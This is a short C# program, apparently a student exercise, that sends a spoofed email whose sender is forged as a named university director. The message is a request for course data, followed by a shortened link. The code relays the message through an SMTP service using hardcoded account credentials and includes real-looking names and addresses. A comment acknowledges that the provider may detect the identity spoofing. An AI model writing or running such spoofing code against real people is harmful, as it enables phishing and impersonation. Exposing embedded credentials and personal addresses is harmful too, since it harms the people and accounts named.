using System.Net;
using System.Net.Mail;
using System;


namespace FirstApp
{
    class Program
    {
        /* Spoofmail is the class that gonna send the spoof mail*/
        class Spoofmail
        {
            
            public void SendMail(MailMessage message)
            {
                try
                {
                    var fromAddress = new MailAddress("Probes@gmail.com");
                    const string fromPassword = "NWpsYTBmejEzdTcw";
                    var Smtp = new SmtpClient
                    {

                        /** It is likely that the provider (smtp server) detects that the service is being used for identity supresentation therefore,
                         * it is likely that it will not work in the future, and it will be necessary to change it**/


                        Host = "mail.smtp2go.com",
                        Port = 25,
                        EnableSsl = true,
                        DeliveryMethod = SmtpDeliveryMethod.Network,
                        UseDefaultCredentials = false,
                        Credentials = new NetworkCredential(fromAddress.Address,fromPassword)
                    };
                    Smtp.Send(message);
                    Console.WriteLine("Sent!");
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                    Console.Read();
                }

            }


        }


        static void Main(string[] args)
        {
            /* Declare a object from the MailMessage class */
            MailMessage message = new MailMessage()
            {
                SubjectEncoding = System.Text.Encoding.UTF8,
                BodyEncoding = System.Text.Encoding.UTF8,
                IsBodyHtml = true

            };

            /* Add some atribute to the message object*/ 
            message.Body = "<div><label>Saludos Ivan, Necesito que me envios los datos  del curso con NRC:1163 (desarrollo de aplicaciones .net)  para realizar realizar la prematricula y seleccion de los curso del proxim... Sorry, just Me  Andres Benavides, with code T00038399, supplanting the identity of the director :v and please don't open this link goo.gl/6EK5Uu ;) </label></div>";
            message.Subject = "Urgente ";
            message.From = new MailAddress("jairo@utbvirtual.edu.co", "<Jairo Enrique Serrano Castañeda>");
            message.To.Add("<jrnp1997@gmail.com>");
   

            /* Here we declare a new instance of the Spoofmail class */
            Spoofmail Spoof = new Spoofmail();

            Spoof.SendMail(message);

        }
    }
}
